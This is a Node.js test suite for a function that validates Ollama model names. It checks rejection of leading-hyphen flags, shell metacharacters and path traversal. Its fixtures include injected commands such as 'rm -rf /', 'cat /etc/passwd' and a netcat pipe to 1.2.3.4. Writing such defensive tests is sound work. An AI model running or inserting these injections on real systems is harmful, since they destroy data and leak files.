#!/usr/bin/env node
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const { validateOllamaModelName } = require('../src/main.cjs');

console.log('=== AI WORKER MODEL NAME VALIDATION & CLI INJECTION SUITE ===');

assert.equal(typeof validateOllamaModelName, 'function', 'validateOllamaModelName should be exported');

// 1. Valid model names (positive vectors)
const validModels = [
  'llama3',
  'llama3:8b',
  'qwen2.5-coder:7b-instruct-q4_K_M',
  'nomic-embed-text:v1.5',
  'mistral_model-1.2:latest',
  'deepseek-r1:1.5b',
];

for (const m of validModels) {
  const res = validateOllamaModelName(m);
  assert.equal(res.ok, true, `Expected "${m}" to be valid`);
  assert.equal(res.model, m);
}
console.log('✓ Vector 1: Valid model names accepted (6/6)');

// 2. CLI flag/argument injection attacks (leading hyphen)
const flagAttacks = [
  '--help',
  '-v',
  '--insecure',
  '-O',
  '-model',
  '--version',
];

for (const m of flagAttacks) {
  const res = validateOllamaModelName(m);
  assert.equal(res.ok, false, `Expected "${m}" to be rejected due to leading hyphen`);
  assert.match(res.error, /leading hyphens are strictly rejected/i);
}
console.log('✓ Vector 2: CLI argument injection attempts rejected (6/6)');

// 3. Shell metacharacters attacks
const shellAttacks = [
  'llama3; rm -rf /',
  'llama3 && cat /etc/passwd',
  'llama3 | nc 1.2.3.4 9999',
  'llama3`whoami`',
  'llama3$USER',
];

for (const m of shellAttacks) {
  const res = validateOllamaModelName(m);
  assert.equal(res.ok, false, `Expected "${m}" to be rejected due to shell metacharacters`);
  assert.match(res.error, /shell metacharacters are forbidden/i);
}
console.log('✓ Vector 3: Shell metacharacters rejected (5/5)');

// 4. Formatting and path traversal attacks
const invalidFormat = [
  '',
  '   ',
  '../../../etc/passwd',
  'model/with/slashes',
  'model with spaces',
  'model::doubletag',
];

for (const m of invalidFormat) {
  const res = validateOllamaModelName(m);
  assert.equal(res.ok, false, `Expected "${m}" to be rejected due to formatting`);
}
console.log('✓ Vector 4: Path traversal and malformed inputs rejected (6/6)');

console.log('=== ALL VECTORS PASSED (100% OK) ===');
